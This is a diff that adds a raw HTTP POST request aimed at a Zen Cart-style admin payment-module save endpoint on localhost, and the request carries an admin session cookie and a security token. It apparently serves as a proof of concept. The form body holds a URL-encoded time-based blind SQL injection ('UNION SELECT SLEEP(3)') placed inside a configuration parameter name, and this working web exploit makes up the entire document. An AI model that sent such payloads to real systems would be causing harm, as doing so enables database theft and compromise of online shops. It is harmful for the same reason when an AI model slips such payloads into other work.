@@ -1,0 +1,7 @@
+POST /stomP-LGR-Feast/index.php?cmd=modules&set=payment&module=moneyorder&action=save HTTP/1.1
+Host: localhost:8000
+Content-Type: application/x-www-form-urlencoded
+Cookie: zenAdminID=816502d2c75e275f715060243238ade0; JSESSIONID=5af44dbe-f664-4bb7-99d8-047377cd5626
+Content-Length: 143
+
+securityToken=9a7ce36600cc85bb72d232f7f8ec0ff5&action=saveall&configuration[INVALID%27%20UNION%20SELECT%20SLEEP%283%29%2C%20%272%27%20%23]=test
